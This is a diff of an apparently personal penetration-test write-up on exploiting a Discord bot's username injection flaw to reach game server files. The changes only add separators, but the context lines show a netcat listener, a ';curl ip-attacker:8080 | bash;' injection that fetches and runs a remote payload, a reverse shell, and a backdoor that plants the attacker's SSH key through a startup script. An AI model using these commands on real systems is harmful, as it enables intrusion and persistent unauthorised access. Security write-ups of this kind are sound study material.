@@ -1,7 +1,7 @@
 # Exploiting Discord Bot Vulnerability to Gain Access to Game Server Files
 
 
-
+---
 
 
 ## Introduction
@@ -40,7 +40,7 @@ In addition to the code injection vulnerability, the system also presented a mis
 Since this script is executed by the game server process running under `user-b`, modifying its content and then restarting the server makes it possible to execute arbitrary code with `user-b`'s privileges, ultimately granting access to the game server files.
 
   
-
+---
 
 
 
@@ -49,7 +49,7 @@ Since this script is executed by the game server process running under `user-b`,
 - Attacker is aware of the injection vulnerability in the bot’s username handling.
   
 
-
+---
 
 
 ## Attacker Setup
@@ -75,6 +75,8 @@ nc -lvnp 8081
 
 In the response.txt file there is the payload that the attacker wants to execute, wich is sent as a response to http get requests to `process 1`.
 
+---
+
 ## Exploit
 
 The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
@@ -84,6 +86,7 @@ The username used for this injection was:
 ```
 ;curl ip-attacker:8080 | bash;
 ```
+---
 
 ## Execution
 
@@ -125,7 +128,7 @@ The username was set to:
 
 With the username set, the attacker can trigger the exploit by sending the command `!dice` to the bot.
 
-
+---
 
 ## Post-Exploitation
 Once i obtained a reberse shell, and i was able to navigate inside the user-a folder, accessing all doscord bot's files, including user-b's script `server_start.sh`
@@ -135,7 +138,7 @@ Once i obtained a reberse shell, and i was able to navigate inside the user-a fo
 But i did not have access rights to user-b folder, containing the game server's files
 ![Nat Configuration](images/Screenshot_tree.png)
 
-
+---
 
 ## Privilege Escalation
 
@@ -176,7 +179,7 @@ echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92Zgdr
 ```  
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.  
 
-
+---
 
 ## Server Restart
 
